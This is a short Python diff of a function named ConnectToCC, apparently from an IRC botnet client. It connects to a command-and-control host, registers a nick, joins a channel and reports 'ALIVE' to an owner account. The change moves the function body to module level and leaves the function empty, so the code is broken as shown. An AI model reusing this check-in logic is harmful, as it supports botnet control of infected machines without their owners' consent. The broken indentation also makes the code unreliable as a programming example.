@@ -29,21 +29,22 @@ def ConnectToCC():
     global CC_CONNECTED
     global CC_SOCK
 
-    print("**** Connecting to: " + CC_HOST + ":" + str(CC_PORT) + " ****")
-    CC_SOCK.connect((CC_HOST, CC_PORT))
-    time.sleep(3)
-    CC_SOCK.setblocking(False)
-    tmps = "USER " + CC_NAME + " " + CC_NAME + " " + CC_NAME + " :bro\n"
-    CC_SOCK.send(tmps)
-    time.sleep(3)
-    CC_SOCK.send("NICK " + CC_NAME + "\n")
-    time.sleep(3)
-    CC_SOCK.send("JOIN " + CC_CHAN + "\n")
-    time.sleep(3)
-    CC_SOCK.send("PRIVMSG " + CC_OWNR + " " + CC_NAME + " ALIVE\n")
-    CC_SOCK.send("PRIVMSG " + CC_CHAN + " " + CC_NAME + " ALIVE\n")
-    print("DONE\n")
-    CC_CONNECTED = True
+
+print("**** Connecting to: " + CC_HOST + ":" + str(CC_PORT) + " ****")
+CC_SOCK.connect((CC_HOST, CC_PORT))
+time.sleep(3)
+CC_SOCK.setblocking(False)
+tmps = "USER " + CC_NAME + " " + CC_NAME + " " + CC_NAME + " :bro\n"
+CC_SOCK.send(tmps)
+time.sleep(3)
+CC_SOCK.send("NICK " + CC_NAME + "\n")
+time.sleep(3)
+CC_SOCK.send("JOIN " + CC_CHAN + "\n")
+time.sleep(3)
+CC_SOCK.send("PRIVMSG " + CC_OWNR + " " + CC_NAME + " ALIVE\n")
+CC_SOCK.send("PRIVMSG " + CC_CHAN + " " + CC_NAME + " ALIVE\n")
+print("DONE\n")
+CC_CONNECTED = True
 
 
 def ConnectToC1():
